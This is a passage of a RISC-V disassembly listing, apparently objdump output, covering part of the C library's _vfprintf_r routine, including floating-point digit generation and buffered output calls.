   11c1c:	fed33c23          	sd	a3,-8(t1)
   11c20:	2705                	addiw	a4,a4,1
   11c22:	f23e                	sd	a5,288(sp)
   11c24:	0007069b          	sext.w	a3,a4
   11c28:	10e12c23          	sw	a4,280(sp)
   11c2c:	0cdc4e63          	blt	s8,a3,11d08 <_vfprintf_r+0x14a2>
   11c30:	7726                	ld	a4,104(sp)
   11c32:	00074603          	lbu	a2,0(a4)
   11c36:	7742                	ld	a4,48(sp)
   11c38:	41b705bb          	subw	a1,a4,s11
   11c3c:	0006071b          	sext.w	a4,a2
   11c40:	0007069b          	sext.w	a3,a4
   11c44:	00e5d463          	bge	a1,a4,11c4c <_vfprintf_r+0x13e6>
   11c48:	0005869b          	sext.w	a3,a1
   11c4c:	02d05663          	blez	a3,11c78 <_vfprintf_r+0x1412>
   11c50:	11812703          	lw	a4,280(sp)
   11c54:	97b6                	add	a5,a5,a3
   11c56:	01b33023          	sd	s11,0(t1)
   11c5a:	0017061b          	addiw	a2,a4,1
   11c5e:	00d33423          	sd	a3,8(t1)
   11c62:	f23e                	sd	a5,288(sp)
   11c64:	10c12c23          	sw	a2,280(sp)
   11c68:	0acc4a63          	blt	s8,a2,11d1c <_vfprintf_r+0x14b6>
   11c6c:	7726                	ld	a4,104(sp)
   11c6e:	0341                	addi	t1,t1,16
   11c70:	00074603          	lbu	a2,0(a4)
   11c74:	0006071b          	sext.w	a4,a2
   11c78:	fff6c593          	not	a1,a3
   11c7c:	95fd                	srai	a1,a1,0x3f
   11c7e:	8eed                	and	a3,a3,a1
   11c80:	9f15                	subw	a4,a4,a3
   11c82:	00e04c63          	bgtz	a4,11c9a <_vfprintf_r+0x1434>
   11c86:	9db2                	add	s11,s11,a2
   11c88:	7706                	ld	a4,96(sp)
   11c8a:	fb2d                	bnez	a4,11bfc <_vfprintf_r+0x1396>
   11c8c:	6746                	ld	a4,80(sp)
   11c8e:	30070463          	beqz	a4,11f96 <_vfprintf_r+0x1730>
   11c92:	6746                	ld	a4,80(sp)
   11c94:	377d                	addiw	a4,a4,-1
   11c96:	e8ba                	sd	a4,80(sp)
   11c98:	bf95                	j	11c0c <_vfprintf_r+0x13a6>
   11c9a:	11812683          	lw	a3,280(sp)
   11c9e:	00ed4663          	blt	s10,a4,11caa <_vfprintf_r+0x1444>
   11ca2:	a081                	j	11ce2 <_vfprintf_r+0x147c>
   11ca4:	3741                	addiw	a4,a4,-16
   11ca6:	02ed5e63          	bge	s10,a4,11ce2 <_vfprintf_r+0x147c>
   11caa:	2685                	addiw	a3,a3,1
   11cac:	07c1                	addi	a5,a5,16
   11cae:	01233023          	sd	s2,0(t1)
   11cb2:	01a33423          	sd	s10,8(t1)
   11cb6:	f23e                	sd	a5,288(sp)
   11cb8:	10d12c23          	sw	a3,280(sp)
   11cbc:	0341                	addi	t1,t1,16
   11cbe:	fedc53e3          	bge	s8,a3,11ca4 <_vfprintf_r+0x143e>
   11cc2:	0a10                	addi	a2,sp,272
   11cc4:	85d2                	mv	a1,s4
   11cc6:	8556                	mv	a0,s5
   11cc8:	e43a                	sd	a4,8(sp)
   11cca:	15a070ef          	jal	ra,18e24 <__sprint_r>
   11cce:	f2051c63          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11cd2:	6722                	ld	a4,8(sp)
   11cd4:	7792                	ld	a5,288(sp)
   11cd6:	11812683          	lw	a3,280(sp)
   11cda:	3741                	addiw	a4,a4,-16
   11cdc:	835e                	mv	t1,s7
   11cde:	fced46e3          	blt	s10,a4,11caa <_vfprintf_r+0x1444>
   11ce2:	2685                	addiw	a3,a3,1
   11ce4:	97ba                	add	a5,a5,a4
   11ce6:	00e33423          	sd	a4,8(t1)
   11cea:	01233023          	sd	s2,0(t1)
   11cee:	f23e                	sd	a5,288(sp)
   11cf0:	0006871b          	sext.w	a4,a3
   11cf4:	10d12c23          	sw	a3,280(sp)
   11cf8:	32ec4463          	blt	s8,a4,12020 <_vfprintf_r+0x17ba>
   11cfc:	7726                	ld	a4,104(sp)
   11cfe:	0341                	addi	t1,t1,16
   11d00:	00074603          	lbu	a2,0(a4)
   11d04:	9db2                	add	s11,s11,a2
   11d06:	b749                	j	11c88 <_vfprintf_r+0x1422>
   11d08:	0a10                	addi	a2,sp,272
   11d0a:	85d2                	mv	a1,s4
   11d0c:	8556                	mv	a0,s5
   11d0e:	116070ef          	jal	ra,18e24 <__sprint_r>
   11d12:	ee051a63          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11d16:	7792                	ld	a5,288(sp)
   11d18:	835e                	mv	t1,s7
   11d1a:	bf19                	j	11c30 <_vfprintf_r+0x13ca>
   11d1c:	0a10                	addi	a2,sp,272
   11d1e:	85d2                	mv	a1,s4
   11d20:	8556                	mv	a0,s5
   11d22:	e436                	sd	a3,8(sp)
   11d24:	100070ef          	jal	ra,18e24 <__sprint_r>
   11d28:	ec051f63          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11d2c:	77a6                	ld	a5,104(sp)
   11d2e:	66a2                	ld	a3,8(sp)
   11d30:	835e                	mv	t1,s7
   11d32:	0007c603          	lbu	a2,0(a5)
   11d36:	7792                	ld	a5,288(sp)
   11d38:	0006071b          	sext.w	a4,a2
   11d3c:	bf35                	j	11c78 <_vfprintf_r+0x1412>
   11d3e:	2605                	addiw	a2,a2,1
   11d40:	01070313          	addi	t1,a4,16
   11d44:	8c3a                	mv	s8,a4
   11d46:	f76ff06f          	j	114bc <_vfprintf_r+0xc56>
   11d4a:	0a10                	addi	a2,sp,272
   11d4c:	85d2                	mv	a1,s4
   11d4e:	8556                	mv	a0,s5
   11d50:	0d4070ef          	jal	ra,18e24 <__sprint_r>
   11d54:	ea051963          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11d58:	562e                	lw	a2,232(sp)
   11d5a:	7792                	ld	a5,288(sp)
   11d5c:	835e                	mv	t1,s7
   11d5e:	b329                	j	11a68 <_vfprintf_r+0x1202>
   11d60:	0000bc97          	auipc	s9,0xb
   11d64:	890c8c93          	addi	s9,s9,-1904 # 1c5f0 <__clzdi2+0x17e>
   11d68:	bb79                	j	11b06 <_vfprintf_r+0x12a0>
   11d6a:	0a10                	addi	a2,sp,272
   11d6c:	85d2                	mv	a1,s4
   11d6e:	8556                	mv	a0,s5
   11d70:	0b4070ef          	jal	ra,18e24 <__sprint_r>
   11d74:	e8051963          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11d78:	7792                	ld	a5,288(sp)
   11d7a:	835e                	mv	t1,s7
   11d7c:	b8e5                	j	11674 <_vfprintf_r+0xe0e>
   11d7e:	4c19                	li	s8,6
   11d80:	b135                	j	119ac <_vfprintf_r+0x1146>
   11d82:	7682                	ld	a3,32(sp)
   11d84:	00dc8833          	add	a6,s9,a3
   11d88:	40e6873b          	subw	a4,a3,a4
   11d8c:	41b80ebb          	subw	t4,a6,s11
   11d90:	0007069b          	sext.w	a3,a4
   11d94:	00ded363          	bge	t4,a3,11d9a <_vfprintf_r+0x1534>
   11d98:	8776                	mv	a4,t4
   11d9a:	00070c9b          	sext.w	s9,a4
   11d9e:	b2bd                	j	1170c <_vfprintf_r+0xea6>
   11da0:	6782                	ld	a5,0(sp)
   11da2:	8ca2                	mv	s9,s0
   11da4:	00f71023          	sh	a5,0(a4)
   11da8:	d51fe06f          	j	10af8 <_vfprintf_r+0x292>
   11dac:	1982                	slli	s3,s3,0x20
   11dae:	0209d993          	srli	s3,s3,0x20
   11db2:	e55fe06f          	j	10c06 <_vfprintf_r+0x3a0>
   11db6:	67c2                	ld	a5,16(sp)
   11db8:	0007a983          	lw	s3,0(a5)
   11dbc:	87ce                	mv	a5,s3
   11dbe:	debfe06f          	j	10ba8 <_vfprintf_r+0x342>
   11dc2:	1982                	slli	s3,s3,0x20
   11dc4:	0209d993          	srli	s3,s3,0x20
   11dc8:	e83a                	sd	a4,16(sp)
   11dca:	4785                	li	a5,1
   11dcc:	e47fe06f          	j	10c12 <_vfprintf_r+0x3ac>
   11dd0:	1982                	slli	s3,s3,0x20
   11dd2:	0209d993          	srli	s3,s3,0x20
   11dd6:	b685                	j	11936 <_vfprintf_r+0x10d0>
   11dd8:	02d00793          	li	a5,45
   11ddc:	0cf10fa3          	sb	a5,223(sp)
   11de0:	b3d9                	j	11ba6 <_vfprintf_r+0x1340>
   11de2:	0a10                	addi	a2,sp,272
   11de4:	85d2                	mv	a1,s4
   11de6:	8556                	mv	a0,s5
   11de8:	03c070ef          	jal	ra,18e24 <__sprint_r>
   11dec:	d1dfe06f          	j	10b08 <_vfprintf_r+0x2a2>
   11df0:	03000793          	li	a5,48
   11df4:	0ef10023          	sb	a5,224(sp)
   11df8:	05800713          	li	a4,88
   11dfc:	0024e793          	ori	a5,s1,2
   11e00:	2781                	sext.w	a5,a5
   11e02:	0ee100a3          	sb	a4,225(sp)
   11e06:	ed3e                	sd	a5,152(sp)
   11e08:	06300713          	li	a4,99
   11e0c:	ec02                	sd	zero,24(sp)
   11e0e:	12810c93          	addi	s9,sp,296
   11e12:	47d74563          	blt	a4,t4,1227c <_vfprintf_r+0x1a16>
   11e16:	69b2                	ld	s3,264(sp)
   11e18:	fdfdf713          	andi	a4,s11,-33
   11e1c:	1024e493          	ori	s1,s1,258
   11e20:	f0ba                	sd	a4,96(sp)
   11e22:	e582                	sd	zero,200(sp)
   11e24:	6c12                	ld	s8,256(sp)
   11e26:	2481                	sext.w	s1,s1
   11e28:	1e09c463          	bltz	s3,12010 <_vfprintf_r+0x17aa>
   11e2c:	06100793          	li	a5,97
   11e30:	52fd8c63          	beq	s11,a5,12368 <_vfprintf_r+0x1b02>
   11e34:	04100793          	li	a5,65
   11e38:	00fd8463          	beq	s11,a5,11e40 <_vfprintf_r+0x15da>
   11e3c:	eb7fe06f          	j	10cf2 <_vfprintf_r+0x48c>
   11e40:	85ce                	mv	a1,s3
   11e42:	8562                	mv	a0,s8
   11e44:	fc1a                	sd	t1,56(sp)
   11e46:	f876                	sd	t4,48(sp)
   11e48:	3f80a0ef          	jal	ra,1c240 <__trunctfdf2>
   11e4c:	11a8                	addi	a0,sp,232
   11e4e:	765040ef          	jal	ra,16db2 <frexp>
   11e52:	32e0a0ef          	jal	ra,1c180 <__extenddftf2>
   11e56:	0000b797          	auipc	a5,0xb
   11e5a:	9aa78793          	addi	a5,a5,-1622 # 1c800 <zeroes.4521+0x38>
   11e5e:	6390                	ld	a2,0(a5)
   11e60:	6794                	ld	a3,8(a5)
   11e62:	41e090ef          	jal	ra,1b280 <__multf3>
   11e66:	4601                	li	a2,0
   11e68:	4681                	li	a3,0
   11e6a:	f02a                	sd	a0,32(sp)
   11e6c:	e42e                	sd	a1,8(sp)
   11e6e:	22e090ef          	jal	ra,1b09c <__eqtf2>
   11e72:	62a2                	ld	t0,8(sp)
   11e74:	7702                	ld	a4,32(sp)
   11e76:	7ec2                	ld	t4,48(sp)
   11e78:	7362                	ld	t1,56(sp)
   11e7a:	e119                	bnez	a0,11e80 <_vfprintf_r+0x161a>
   11e7c:	4785                	li	a5,1
   11e7e:	d5be                	sw	a5,232(sp)
   11e80:	0000a797          	auipc	a5,0xa
   11e84:	78878793          	addi	a5,a5,1928 # 1c608 <__clzdi2+0x196>
   11e88:	e8be                	sd	a5,80(sp)
   11e8a:	020e9793          	slli	a5,t4,0x20
   11e8e:	0000b697          	auipc	a3,0xb
   11e92:	95268693          	addi	a3,a3,-1710 # 1c7e0 <zeroes.4521+0x18>
   11e96:	9381                	srli	a5,a5,0x20
   11e98:	6290                	ld	a2,0(a3)
   11e9a:	0785                	addi	a5,a5,1
   11e9c:	6694                	ld	a3,8(a3)
   11e9e:	97e6                	add	a5,a5,s9
   11ea0:	f13e                	sd	a5,160(sp)
   11ea2:	01dc87bb          	addw	a5,s9,t4
   11ea6:	fd32                	sd	a2,184(sp)
   11ea8:	e1b6                	sd	a3,192(sp)
   11eaa:	8c66                	mv	s8,s9
   11eac:	db3e                	sw	a5,180(sp)
   11eae:	a831                	j	11eca <_vfprintf_r+0x1664>
   11eb0:	4601                	li	a2,0
   11eb2:	4681                	li	a3,0
   11eb4:	e4ae                	sd	a1,72(sp)
   11eb6:	e0aa                	sd	a0,64(sp)
   11eb8:	1e4090ef          	jal	ra,1b09c <__eqtf2>
   11ebc:	7ec2                	ld	t4,48(sp)
   11ebe:	7362                	ld	t1,56(sp)
   11ec0:	6f86                	ld	t6,64(sp)
   11ec2:	68a6                	ld	a7,72(sp)
   11ec4:	62a2                	ld	t0,8(sp)
   11ec6:	7702                	ld	a4,32(sp)
   11ec8:	c135                	beqz	a0,11f2c <_vfprintf_r+0x16c6>
   11eca:	766a                	ld	a2,184(sp)
   11ecc:	668e                	ld	a3,192(sp)
   11ece:	853a                	mv	a0,a4
   11ed0:	8596                	mv	a1,t0
   11ed2:	fc1a                	sd	t1,56(sp)
   11ed4:	f876                	sd	t4,48(sp)
   11ed6:	3aa090ef          	jal	ra,1b280 <__multf3>
   11eda:	e42e                	sd	a1,8(sp)
   11edc:	f02a                	sd	a0,32(sp)
   11ede:	1b00a0ef          	jal	ra,1c08e <__fixtfsi>
   11ee2:	0005099b          	sext.w	s3,a0
   11ee6:	854e                	mv	a0,s3
   11ee8:	23c0a0ef          	jal	ra,1c124 <__floatsitf>
   11eec:	7882                	ld	a7,32(sp)
   11eee:	6722                	ld	a4,8(sp)
   11ef0:	862a                	mv	a2,a0
   11ef2:	86ae                	mv	a3,a1
   11ef4:	8546                	mv	a0,a7
   11ef6:	85ba                	mv	a1,a4
   11ef8:	19b090ef          	jal	ra,1b892 <__subtf3>
   11efc:	67c6                	ld	a5,80(sp)
   11efe:	f562                	sd	s8,168(sp)
   11f00:	0c05                	addi	s8,s8,1
   11f02:	01378733          	add	a4,a5,s3
   11f06:	57da                	lw	a5,180(sp)
   11f08:	00074703          	lbu	a4,0(a4)
   11f0c:	f02a                	sd	a0,32(sp)
   11f0e:	418787bb          	subw	a5,a5,s8
   11f12:	ecbe                	sd	a5,88(sp)
   11f14:	778a                	ld	a5,160(sp)
   11f16:	feec0fa3          	sb	a4,-1(s8)
   11f1a:	e42e                	sd	a1,8(sp)
   11f1c:	7ec2                	ld	t4,48(sp)
   11f1e:	7362                	ld	t1,56(sp)
   11f20:	8faa                	mv	t6,a0
   11f22:	88ae                	mv	a7,a1
   11f24:	f98796e3          	bne	a5,s8,11eb0 <_vfprintf_r+0x164a>
   11f28:	57fd                	li	a5,-1
   11f2a:	ecbe                	sd	a5,88(sp)
   11f2c:	0000b717          	auipc	a4,0xb
   11f30:	8c470713          	addi	a4,a4,-1852 # 1c7f0 <zeroes.4521+0x28>
   11f34:	6310                	ld	a2,0(a4)
   11f36:	6714                	ld	a3,8(a4)
   11f38:	857e                	mv	a0,t6
   11f3a:	85c6                	mv	a1,a7
   11f3c:	f01a                	sd	t1,32(sp)
   11f3e:	e476                	sd	t4,8(sp)
   11f40:	e4fe                	sd	t6,72(sp)
   11f42:	e0b2                	sd	a2,64(sp)
   11f44:	fc36                	sd	a3,56(sp)
   11f46:	f846                	sd	a7,48(sp)
   11f48:	1e8090ef          	jal	ra,1b130 <__getf2>
   11f4c:	6ea2                	ld	t4,8(sp)
   11f4e:	7302                	ld	t1,32(sp)
   11f50:	2ca04f63          	bgtz	a0,1222e <_vfprintf_r+0x19c8>
   11f54:	6fa6                	ld	t6,72(sp)
   11f56:	78c2                	ld	a7,48(sp)
   11f58:	6606                	ld	a2,64(sp)
   11f5a:	76e2                	ld	a3,56(sp)
   11f5c:	857e                	mv	a0,t6
   11f5e:	85c6                	mv	a1,a7
   11f60:	13c090ef          	jal	ra,1b09c <__eqtf2>
   11f64:	6ea2                	ld	t4,8(sp)
   11f66:	7302                	ld	t1,32(sp)
   11f68:	e509                	bnez	a0,11f72 <_vfprintf_r+0x170c>
   11f6a:	0019f993          	andi	s3,s3,1
   11f6e:	2c099063          	bnez	s3,1222e <_vfprintf_r+0x19c8>
   11f72:	67e6                	ld	a5,88(sp)
   11f74:	03000693          	li	a3,48
   11f78:	00178713          	addi	a4,a5,1
   11f7c:	9762                	add	a4,a4,s8
   11f7e:	0007c763          	bltz	a5,11f8c <_vfprintf_r+0x1726>
   11f82:	0c05                	addi	s8,s8,1
   11f84:	fedc0fa3          	sb	a3,-1(s8)
   11f88:	ff871de3          	bne	a4,s8,11f82 <_vfprintf_r+0x171c>
   11f8c:	419c07bb          	subw	a5,s8,s9
   11f90:	f03e                	sd	a5,32(sp)
   11f92:	de5fe06f          	j	10d76 <_vfprintf_r+0x510>
   11f96:	7702                	ld	a4,32(sp)
   11f98:	9766                	add	a4,a4,s9
   11f9a:	efb77e63          	bgeu	a4,s11,11696 <_vfprintf_r+0xe30>
   11f9e:	8dba                	mv	s11,a4
   11fa0:	ef6ff06f          	j	11696 <_vfprintf_r+0xe30>
   11fa4:	6766                	ld	a4,88(sp)
   11fa6:	57f5                	li	a5,-3
   11fa8:	00f74463          	blt	a4,a5,11fb0 <_vfprintf_r+0x174a>
   11fac:	00eed863          	bge	t4,a4,11fbc <_vfprintf_r+0x1756>
   11fb0:	3df9                	addiw	s11,s11,-2
   11fb2:	fdfdf793          	andi	a5,s11,-33
   11fb6:	f0be                	sd	a5,96(sp)
   11fb8:	ddffe06f          	j	10d96 <_vfprintf_r+0x530>
   11fbc:	7782                	ld	a5,32(sp)
   11fbe:	6766                	ld	a4,88(sp)
   11fc0:	16f74563          	blt	a4,a5,1212a <_vfprintf_r+0x18c4>
   11fc4:	67ea                	ld	a5,152(sp)
   11fc6:	8c3a                	mv	s8,a4
   11fc8:	8b85                	andi	a5,a5,1
   11fca:	c781                	beqz	a5,11fd2 <_vfprintf_r+0x176c>
   11fcc:	77c6                	ld	a5,112(sp)
   11fce:	00e78c3b          	addw	s8,a5,a4
   11fd2:	67ea                	ld	a5,152(sp)
   11fd4:	4007f793          	andi	a5,a5,1024
   11fd8:	c781                	beqz	a5,11fe0 <_vfprintf_r+0x177a>
   11fda:	67e6                	ld	a5,88(sp)
   11fdc:	30f04763          	bgtz	a5,122ea <_vfprintf_r+0x1a84>
   11fe0:	fffc4993          	not	s3,s8
   11fe4:	43f9d993          	srai	s3,s3,0x3f
   11fe8:	013c79b3          	and	s3,s8,s3
   11fec:	2981                	sext.w	s3,s3
   11fee:	06700d93          	li	s11,103
   11ff2:	e882                	sd	zero,80(sp)
   11ff4:	f082                	sd	zero,96(sp)
   11ff6:	e83fe06f          	j	10e78 <_vfprintf_r+0x612>
   11ffa:	0df14783          	lbu	a5,223(sp)
   11ffe:	4e81                	li	t4,0
   12000:	c399                	beqz	a5,12006 <_vfprintf_r+0x17a0>
   12002:	be9fe06f          	j	10bea <_vfprintf_r+0x384>
   12006:	a11fe06f          	j	10a16 <_vfprintf_r+0x1b0>
   1200a:	ed26                	sd	s1,152(sp)
   1200c:	ec02                	sd	zero,24(sp)
   1200e:	84fe                	mv	s1,t6
   12010:	57fd                	li	a5,-1
   12012:	17fe                	slli	a5,a5,0x3f
   12014:	00f9c9b3          	xor	s3,s3,a5
   12018:	02d00793          	li	a5,45
   1201c:	e5be                	sd	a5,200(sp)
   1201e:	b539                	j	11e2c <_vfprintf_r+0x15c6>
   12020:	0a10                	addi	a2,sp,272
   12022:	85d2                	mv	a1,s4
   12024:	8556                	mv	a0,s5
   12026:	5ff060ef          	jal	ra,18e24 <__sprint_r>
   1202a:	bc051e63          	bnez	a0,11406 <_vfprintf_r+0xba0>
   1202e:	77a6                	ld	a5,104(sp)
   12030:	835e                	mv	t1,s7
   12032:	0007c603          	lbu	a2,0(a5)
   12036:	7792                	ld	a5,288(sp)
   12038:	9db2                	add	s11,s11,a2
   1203a:	b1b9                	j	11c88 <_vfprintf_r+0x1422>
   1203c:	02d00793          	li	a5,45
   12040:	0cf10fa3          	sb	a5,223(sp)
   12044:	bc4d                	j	11af6 <_vfprintf_r+0x1290>
   12046:	8776                	mv	a4,t4
   12048:	11bc                	addi	a5,sp,232
   1204a:	0f810893          	addi	a7,sp,248
   1204e:	0ec10813          	addi	a6,sp,236
   12052:	4689                	li	a3,2
   12054:	85e2                	mv	a1,s8
   12056:	864e                	mv	a2,s3
   12058:	8556                	mv	a0,s5
   1205a:	f01a                	sd	t1,32(sp)
   1205c:	e476                	sd	t4,8(sp)
   1205e:	458020ef          	jal	ra,144b6 <_ldtoa_r>
   12062:	7706                	ld	a4,96(sp)
   12064:	04700793          	li	a5,71
   12068:	6ea2                	ld	t4,8(sp)
   1206a:	7302                	ld	t1,32(sp)
   1206c:	8caa                	mv	s9,a0
   1206e:	02f71d63          	bne	a4,a5,120a8 <_vfprintf_r+0x1842>
   12072:	67ea                	ld	a5,152(sp)
   12074:	8b85                	andi	a5,a5,1
   12076:	18079b63          	bnez	a5,1220c <_vfprintf_r+0x19a6>
   1207a:	04700713          	li	a4,71
   1207e:	77ee                	ld	a5,248(sp)
   12080:	f0ba                	sd	a4,96(sp)
   12082:	ceffe06f          	j	10d70 <_vfprintf_r+0x50a>
   12086:	8776                	mv	a4,t4
   12088:	0f810893          	addi	a7,sp,248
   1208c:	0ec10813          	addi	a6,sp,236
   12090:	11bc                	addi	a5,sp,232
   12092:	468d                	li	a3,3
   12094:	85e2                	mv	a1,s8
   12096:	864e                	mv	a2,s3
   12098:	8556                	mv	a0,s5
   1209a:	f01a                	sd	t1,32(sp)
   1209c:	e476                	sd	t4,8(sp)
   1209e:	418020ef          	jal	ra,144b6 <_ldtoa_r>
   120a2:	6ea2                	ld	t4,8(sp)
   120a4:	7302                	ld	t1,32(sp)
   120a6:	8caa                	mv	s9,a0
   120a8:	7706                	ld	a4,96(sp)
   120aa:	04600793          	li	a5,70
   120ae:	01dc88b3          	add	a7,s9,t4
   120b2:	00f70463          	beq	a4,a5,120ba <_vfprintf_r+0x1854>
   120b6:	c85fe06f          	j	10d3a <_vfprintf_r+0x4d4>
   120ba:	000cc703          	lbu	a4,0(s9)
   120be:	03000793          	li	a5,48
   120c2:	00f70663          	beq	a4,a5,120ce <_vfprintf_r+0x1868>
   120c6:	572e                	lw	a4,232(sp)
   120c8:	98ba                	add	a7,a7,a4
   120ca:	c71fe06f          	j	10d3a <_vfprintf_r+0x4d4>
   120ce:	4601                	li	a2,0
   120d0:	4681                	li	a3,0
   120d2:	8562                	mv	a0,s8
   120d4:	85ce                	mv	a1,s3
   120d6:	f846                	sd	a7,48(sp)
   120d8:	f01a                	sd	t1,32(sp)
   120da:	e476                	sd	t4,8(sp)
   120dc:	7c1080ef          	jal	ra,1b09c <__eqtf2>
   120e0:	6ea2                	ld	t4,8(sp)
   120e2:	7302                	ld	t1,32(sp)
   120e4:	78c2                	ld	a7,48(sp)
   120e6:	d165                	beqz	a0,120c6 <_vfprintf_r+0x1860>
   120e8:	4785                	li	a5,1
   120ea:	41d7873b          	subw	a4,a5,t4
   120ee:	d5ba                	sw	a4,232(sp)
   120f0:	98ba                	add	a7,a7,a4
   120f2:	c49fe06f          	j	10d3a <_vfprintf_r+0x4d4>
   120f6:	0a10                	addi	a2,sp,272
   120f8:	85d2                	mv	a1,s4
   120fa:	8556                	mv	a0,s5
   120fc:	529060ef          	jal	ra,18e24 <__sprint_r>
   12100:	b0051363          	bnez	a0,11406 <_vfprintf_r+0xba0>
   12104:	572e                	lw	a4,232(sp)
   12106:	7792                	ld	a5,288(sp)
   12108:	835e                	mv	t1,s7
   1210a:	dc2ff06f          	j	116cc <_vfprintf_r+0xe66>
   1210e:	0df14783          	lbu	a5,223(sp)
   12112:	e836                	sd	a3,16(sp)
   12114:	e882                	sd	zero,80(sp)
   12116:	f082                	sd	zero,96(sp)
   12118:	ec82                	sd	zero,88(sp)
   1211a:	89f6                	mv	s3,t4
   1211c:	8c76                	mv	s8,t4
   1211e:	4e81                	li	t4,0
   12120:	c399                	beqz	a5,12126 <_vfprintf_r+0x18c0>
   12122:	ac9fe06f          	j	10bea <_vfprintf_r+0x384>
   12126:	8f1fe06f          	j	10a16 <_vfprintf_r+0x1b0>
   1212a:	7702                	ld	a4,32(sp)
   1212c:	77c6                	ld	a5,112(sp)
   1212e:	06700d93          	li	s11,103
   12132:	00e78c3b          	addw	s8,a5,a4
   12136:	6766                	ld	a4,88(sp)
   12138:	2ce05263          	blez	a4,123fc <_vfprintf_r+0x1b96>
   1213c:	67ea                	ld	a5,152(sp)
   1213e:	4007f793          	andi	a5,a5,1024
   12142:	1a079663          	bnez	a5,122ee <_vfprintf_r+0x1a88>
   12146:	fffc4993          	not	s3,s8
   1214a:	43f9d993          	srai	s3,s3,0x3f
   1214e:	013c79b3          	and	s3,s8,s3
   12152:	2981                	sext.w	s3,s3
   12154:	bd79                	j	11ff2 <_vfprintf_r+0x178c>
   12156:	67ea                	ld	a5,152(sp)
   12158:	6766                	ld	a4,88(sp)
   1215a:	8b85                	andi	a5,a5,1
   1215c:	00fee7b3          	or	a5,t4,a5
   12160:	2ae05c63          	blez	a4,12418 <_vfprintf_r+0x1bb2>
   12164:	26079d63          	bnez	a5,123de <_vfprintf_r+0x1b78>
   12168:	6c66                	ld	s8,88(sp)
   1216a:	06600d93          	li	s11,102
   1216e:	b7f9                	j	1213c <_vfprintf_r+0x18d6>
   12170:	0a10                	addi	a2,sp,272
   12172:	85d2                	mv	a1,s4
   12174:	8556                	mv	a0,s5
   12176:	4af060ef          	jal	ra,18e24 <__sprint_r>
   1217a:	a8051663          	bnez	a0,11406 <_vfprintf_r+0xba0>
   1217e:	56ae                	lw	a3,232(sp)
   12180:	7702                	ld	a4,32(sp)
   12182:	7792                	ld	a5,288(sp)
   12184:	835e                	mv	t1,s7
   12186:	40d706bb          	subw	a3,a4,a3
   1218a:	d82ff06f          	j	1170c <_vfprintf_r+0xea6>
   1218e:	57fd                	li	a5,-1
   12190:	e03e                	sd	a5,0(sp)
   12192:	985fe06f          	j	10b16 <_vfprintf_r+0x2b0>
   12196:	56c1                	li	a3,-16
   12198:	40c00c3b          	negw	s8,a2
   1219c:	02d65f63          	bge	a2,a3,121da <_vfprintf_r+0x1974>
   121a0:	4d9d                	li	s11,7
   121a2:	a021                	j	121aa <_vfprintf_r+0x1944>
   121a4:	3c41                	addiw	s8,s8,-16
   121a6:	038d5a63          	bge	s10,s8,121da <_vfprintf_r+0x1974>
   121aa:	2705                	addiw	a4,a4,1
   121ac:	07c1                	addi	a5,a5,16
   121ae:	01233023          	sd	s2,0(t1)
   121b2:	01a33423          	sd	s10,8(t1)
   121b6:	f23e                	sd	a5,288(sp)
   121b8:	10e12c23          	sw	a4,280(sp)
   121bc:	0341                	addi	t1,t1,16
   121be:	feedd3e3          	bge	s11,a4,121a4 <_vfprintf_r+0x193e>
   121c2:	0a10                	addi	a2,sp,272
   121c4:	85d2                	mv	a1,s4
   121c6:	8556                	mv	a0,s5
   121c8:	45d060ef          	jal	ra,18e24 <__sprint_r>
   121cc:	a2051d63          	bnez	a0,11406 <_vfprintf_r+0xba0>
   121d0:	7792                	ld	a5,288(sp)
   121d2:	11812703          	lw	a4,280(sp)
   121d6:	835e                	mv	t1,s7
   121d8:	b7f1                	j	121a4 <_vfprintf_r+0x193e>
   121da:	2705                	addiw	a4,a4,1
   121dc:	97e2                	add	a5,a5,s8
   121de:	01233023          	sd	s2,0(t1)
   121e2:	01833423          	sd	s8,8(t1)
   121e6:	f23e                	sd	a5,288(sp)
   121e8:	10e12c23          	sw	a4,280(sp)
   121ec:	469d                	li	a3,7
   121ee:	8ae6d8e3          	bge	a3,a4,11a9e <_vfprintf_r+0x1238>
   121f2:	0a10                	addi	a2,sp,272
   121f4:	85d2                	mv	a1,s4
   121f6:	8556                	mv	a0,s5
   121f8:	42d060ef          	jal	ra,18e24 <__sprint_r>
   121fc:	a0051563          	bnez	a0,11406 <_vfprintf_r+0xba0>
   12200:	7792                	ld	a5,288(sp)
   12202:	11812703          	lw	a4,280(sp)
   12206:	835e                	mv	t1,s7
   12208:	cedfe06f          	j	10ef4 <_vfprintf_r+0x68e>
   1220c:	04700793          	li	a5,71
   12210:	01dc88b3          	add	a7,s9,t4
   12214:	f0be                	sd	a5,96(sp)
   12216:	b25fe06f          	j	10d3a <_vfprintf_r+0x4d4>
   1221a:	8826                	mv	a6,s1
   1221c:	accff06f          	j	114e8 <_vfprintf_r+0xc82>
   12220:	03000793          	li	a5,48
   12224:	0ef10023          	sb	a5,224(sp)
   12228:	07800713          	li	a4,120
   1222c:	bec1                	j	11dfc <_vfprintf_r+0x1596>
   1222e:	77aa                	ld	a5,168(sp)
   12230:	8762                	mv	a4,s8
   12232:	fdbe                	sd	a5,248(sp)
   12234:	67c6                	ld	a5,80(sp)
   12236:	fffc4683          	lbu	a3,-1(s8)
   1223a:	00f7c603          	lbu	a2,15(a5)
   1223e:	00d61e63          	bne	a2,a3,1225a <_vfprintf_r+0x19f4>
   12242:	03000593          	li	a1,48
   12246:	feb70fa3          	sb	a1,-1(a4)
   1224a:	776e                	ld	a4,248(sp)
   1224c:	fff70693          	addi	a3,a4,-1
   12250:	fdb6                	sd	a3,248(sp)
   12252:	fff74683          	lbu	a3,-1(a4)
   12256:	fed608e3          	beq	a2,a3,12246 <_vfprintf_r+0x19e0>
   1225a:	0016861b          	addiw	a2,a3,1
   1225e:	03900593          	li	a1,57
   12262:	0ff67613          	andi	a2,a2,255
   12266:	00b68563          	beq	a3,a1,12270 <_vfprintf_r+0x1a0a>
   1226a:	fec70fa3          	sb	a2,-1(a4)
   1226e:	bb39                	j	11f8c <_vfprintf_r+0x1726>
   12270:	67c6                	ld	a5,80(sp)
   12272:	00a7c603          	lbu	a2,10(a5)
   12276:	fec70fa3          	sb	a2,-1(a4)
   1227a:	bb09                	j	11f8c <_vfprintf_r+0x1726>
   1227c:	001e859b          	addiw	a1,t4,1
   12280:	8556                	mv	a0,s5
